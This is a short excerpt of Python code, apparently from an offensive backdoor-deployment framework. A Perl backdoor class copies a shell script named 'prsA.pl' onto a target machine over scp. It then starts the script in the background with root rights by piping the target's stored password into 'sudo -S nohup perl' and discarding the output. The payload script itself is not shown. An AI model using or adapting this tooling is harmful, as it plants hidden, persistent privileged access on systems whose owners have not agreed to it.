...
class Perl(Backdoor):
    ...
    def get_command(self):
        return "echo " + self.core.curtarget.pword + " | sudo -S nohup perl " + Backdoor.location + "prsA.pl > /dev/null"
    ...
    def do_exploit(self, args):
        ...
        target.scpFiles(self, 'backdoors/shell/perl/prsA.pl', False, Backdoor.location)
